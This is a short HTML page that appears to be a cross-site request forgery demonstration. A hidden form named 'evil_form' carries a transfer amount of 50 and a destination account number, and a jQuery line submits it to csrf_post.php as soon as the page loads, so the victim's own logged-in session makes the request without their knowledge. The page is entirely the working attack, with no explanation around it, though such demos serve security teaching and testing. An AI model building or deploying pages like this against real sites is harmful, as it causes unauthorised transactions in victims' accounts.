<html>
<head>
  <title></title>
  <script src="javascripts/jquery.js"></script>
</head>
<body>

<form id="evil_form" action="csrf_post.php" method="post">
  <input type="hidden" name="amount" value="50">
  <input type="hidden" name="dest" value="123456">
</form>
<script>$('#evil_form').submit();</script>


</body>
</html>
